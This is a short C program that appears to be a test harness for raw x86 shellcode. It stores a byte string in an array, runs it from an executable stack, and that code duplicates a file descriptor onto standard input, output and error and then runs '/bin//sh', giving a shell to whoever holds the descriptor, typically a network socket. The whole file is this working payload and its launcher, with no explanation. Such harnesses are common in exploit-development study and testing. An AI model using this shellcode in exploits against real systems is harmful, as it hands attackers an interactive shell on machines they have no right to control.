#include <stdio.h>

// gcc binary_dup2_code_test.c -z execstack

int main()
{
    char code[] = "\x31\xc9\xb0\x29\xcd\x80\x89\xc1\x49\x89\xcb\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x00";

    void (*fp)(void) = (void (*)(void))code;
    fp();
}